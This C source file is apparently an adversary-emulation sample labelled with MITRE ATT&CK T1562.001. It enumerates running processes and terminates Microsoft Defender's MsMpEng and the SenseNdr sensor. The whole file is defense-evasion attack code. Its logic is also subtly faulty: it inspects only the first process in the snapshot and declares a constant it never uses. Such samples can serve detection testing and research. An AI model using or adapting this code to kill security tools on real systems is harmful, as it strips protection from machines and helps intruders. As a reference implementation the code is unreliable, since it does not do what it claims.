/*
 * T1562.001 — Impair Defenses: Disable/Modify Tools. TerminateProcess (AV/sensor processes).
 */
#include <windows.h>
#include <tlhelp32.h>
#include <string.h>

static const char *msmpeng = "MsMpEng.exe";

int main(void) {
    (void)msmpeng;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 1;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        if (strstr(pe.szExeFile, "MsMpEng") || strstr(pe.szExeFile, "SenseNdr")) {
            HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
            if (h) { TerminateProcess(h, 0); CloseHandle(h); }
        }
    }
    CloseHandle(snap);
    return 0;
}
